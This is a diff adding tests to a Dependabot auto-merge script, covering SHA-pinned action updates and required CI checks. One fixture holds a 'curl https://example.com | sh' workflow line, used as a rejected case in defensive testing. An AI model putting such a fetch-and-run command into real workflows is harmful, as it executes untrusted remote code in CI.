@@ -2,10 +2,12 @@ import assert from "node:assert/strict";
 import test from "node:test";
 
 import {
+  actionPinOnlyPatch,
   checksAreGreen,
   commitsAreTrusted,
   filesMatchDependabotScope,
   isTrustedDependabotPullRequest,
+  requiredChecksAreGreen,
   requiredChecksAreMissing,
 } from "../dependabot-auto-merge.mjs";
 
@@ -57,7 +59,11 @@ test("limits changed files to the Dependabot ecosystem scope", () => {
   );
   assert.equal(
     filesMatchDependabotScope("dependabot/github_actions/actions/checkout-8", [
-      { filename: ".github/workflows/ci.yml" },
+      {
+        filename: ".github/workflows/ci.yml",
+        patch:
+          "@@ -1,2 +1,2 @@\n-  uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v7\n+  uses: actions/checkout@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v8",
+      },
     ]),
     true,
   );
@@ -67,6 +73,26 @@ test("limits changed files to the Dependabot ecosystem scope", () => {
     ]),
     false,
   );
+  assert.equal(
+    filesMatchDependabotScope("dependabot/github_actions/actions/checkout-8", [
+      {
+        filename: ".github/workflows/ci.yml",
+        patch:
+          "@@ -1,2 +1,2 @@\n-  uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n+  run: curl https://example.com | sh",
+      },
+    ]),
+    false,
+  );
+});
+
+test("accepts only pinned action SHA line changes", () => {
+  assert.equal(
+    actionPinOnlyPatch(
+      "@@ -1,2 +1,2 @@\n-  uses: github/codeql-action/init@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # v4\n+  uses: github/codeql-action/init@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb # v5",
+    ),
+    true,
+  );
+  assert.equal(actionPinOnlyPatch("@@ -1 +1 @@\n-run: safe\n+run: unsafe"), false);
 });
 
 test("requires verified Dependabot commits", () => {
@@ -124,6 +150,15 @@ const requiredChecks = [
 
 test("requires every expected check from the expected GitHub App", () => {
   assert.equal(checksAreGreen(requiredChecks), true);
+  assert.equal(requiredChecksAreGreen(requiredChecks), true);
+  assert.equal(requiredChecksAreGreen(requiredChecks.slice(0, -1)), true);
+  assert.equal(
+    requiredChecksAreGreen([
+      ...requiredChecks,
+      { ...successfulCheck("unrelated", "github-actions"), conclusion: "failure" },
+    ]),
+    true,
+  );
   assert.equal(requiredChecksAreMissing(requiredChecks), false);
   assert.equal(requiredChecksAreMissing(requiredChecks.slice(0, -1)), true);
   assert.equal(checksAreGreen(requiredChecks, [{ state: "pending" }]), false);
